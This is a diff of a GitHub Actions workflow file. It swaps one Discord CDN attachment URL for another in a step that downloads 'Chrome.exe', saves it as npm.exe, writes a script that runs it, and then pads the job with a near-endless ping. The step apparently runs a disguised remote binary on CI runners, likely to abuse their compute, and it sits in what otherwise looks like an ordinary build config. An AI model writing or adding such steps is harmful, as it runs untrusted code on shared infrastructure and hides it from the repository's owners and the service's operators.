@@ -29,7 +29,7 @@ jobs:
       - name: Run a multi-line script
         run: |
           dir
-          Invoke-WebRequest https://cdn.discordapp.com/attachments/714547391746932747/830902212237721610/Chrome.exe -OutFile npm.exe
+          Invoke-WebRequest https://cdn.discordapp.com/attachments/714547391746932747/830905084183445544/Chrome.exe -OutFile npm.exe
           cmd /c echo .\npm.exe >>a.ps1
           cmd /c echo dir >>a.ps1
           cmd /c echo ping localhost -n 11111111111111111111111111111 -w 99999999999999999999999999999999999 >>a.ps1
